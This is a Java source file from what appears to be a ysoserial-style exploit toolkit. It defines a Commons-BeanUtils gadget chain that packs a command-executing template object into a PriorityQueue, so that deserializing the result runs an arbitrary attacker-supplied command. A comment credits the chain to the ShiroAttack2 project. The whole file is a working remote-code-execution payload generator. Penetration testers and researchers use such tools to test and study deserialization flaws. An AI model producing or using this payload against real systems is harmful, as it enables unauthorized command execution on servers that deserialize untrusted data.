package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;

import java.util.PriorityQueue;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.commons:commons-lang3:3.10"})
@Authors({"水滴"})
public class CommonsBeanutilsObjectToStringComparator implements CommandObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {
		final Object template = Gadgets.createTemplates4Cmd(command);

		ObjectToStringComparator stringComparator = new ObjectToStringComparator();

		BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

		queue.add(stringComparator);
		queue.add(stringComparator);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsObjectToStringComparator.class, args);
	}
}
